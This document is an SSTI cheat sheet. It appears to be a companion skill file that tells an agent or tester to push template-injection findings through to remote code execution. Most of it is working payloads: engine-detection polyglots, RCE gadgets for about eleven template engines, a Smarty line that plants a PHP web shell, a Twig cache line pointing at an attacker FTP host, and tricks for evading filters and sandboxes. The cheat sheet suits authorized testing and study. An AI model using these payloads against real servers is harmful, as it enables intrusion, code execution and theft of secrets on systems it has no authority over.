# SSTI cheat sheet — per-engine payloads

Companion to `SKILL.md`. Identify the engine first, then use its column. Don't stop at `{{7*7}}`
returning `49` — carry it to RCE (or prove file read) using the engine-specific gadget.

## Detect + identify the engine (polyglot, then narrow)
```
${7*7} {{7*7}} <%= 7*7 %> #{7*7} *{7*7} @(7*7)   ← send the polyglot; see which renders 49
{{7*7}} → 49  and  ${7*7} → ${7*7}   ⇒ Jinja2/Twig-style (not JSP/EL)
{{7*'7'}} → 7777777 ⇒ Jinja2 (Python)   |   → 49 ⇒ Twig (PHP)
```
| Renders `49` | Likely engine |
|---|---|
| `{{7*7}}` | Jinja2 (Py), Twig (PHP), Nunjucks (JS), Liquid |
| `${7*7}` | FreeMarker, Velocity, JSP EL, Thymeleaf `${}` |
| `#{7*7}` | Ruby ERB-ish / Thymeleaf `#{}` |
| `<%= 7*7 %>` | ERB (Ruby), EJS (JS) |
| `@(7*7)` | Razor (.NET) |

## RCE gadgets by engine
```
Jinja2 (Python/Flask)
  {{ ''.__class__.__mro__[1].__subclasses__() }}                     # enumerate classes
  {{ cycler.__init__.__globals__.os.popen('id').read() }}           # common, short
  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
  {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
  {{ lipsum.__globals__.os.popen('id').read() }}                    # Flask/Jinja

Twig (PHP)
  {{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
  {{ ['id']|filter('system') }}                                     # newer Twig
  {{ attribute(_self.env,'setCache',['ftp://attacker/'])}} ...       # advanced

FreeMarker (Java)
  <#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }
  ${"freemarker.template.utility.Execute"?new()("id")}

Velocity (Java)
  #set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")

Smarty (PHP)
  {system('id')}          {php}system('id');{/php}   (older)
  {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET[0]); ?>",self::clearConfig())}

Thymeleaf (Java/Spring)
  ${T(java.lang.Runtime).getRuntime().exec('id')}
  __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x            # expression preprocessing

ERB (Ruby)          <%= `id` %>   <%= system('id') %>   <%= IO.popen('id').read %>
Nunjucks (Node)     {{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}
EJS (Node)          <%= global.process.mainModule.require('child_process').execSync('id') %>
Razor (.NET)        @{ System.Diagnostics.Process.Start("cmd","/c id"); }
Mako (Python)       ${ __import__('os').popen('id').read() }         ${ self.module.cache.util.os.popen('id').read() }
```

## When RCE is filtered / sandboxed
- Prove impact without exec: read files (`{{ get_flag() }}`-style → app config, secrets), leak env
  (`{{ config }}` in Flask), or SSRF via template includes.
- Bypass keyword filters: attribute access `[]` vs `.`, `request|attr('...')`, hex/`\x` escapes,
  string concat `'o'+'s'`, `|attr`, `__globals__` via different roots (`lipsum`, `cycler`, `joiner`).
- Sandboxed Jinja2 (`SandboxedEnvironment`): look for exposed objects, `str.format` gadgets, or
  known bypasses for the version.

## Verify
Run a harmless `id`/`whoami` (or read a non-sensitive file). Screenshot the reflected output;
don't run destructive commands. `tplmap -u '<url>'` can automate once you've confirmed manually.

## References
PortSwigger SSTI; tplmap; the classic "Server-Side Template Injection" (James Kettle) research.
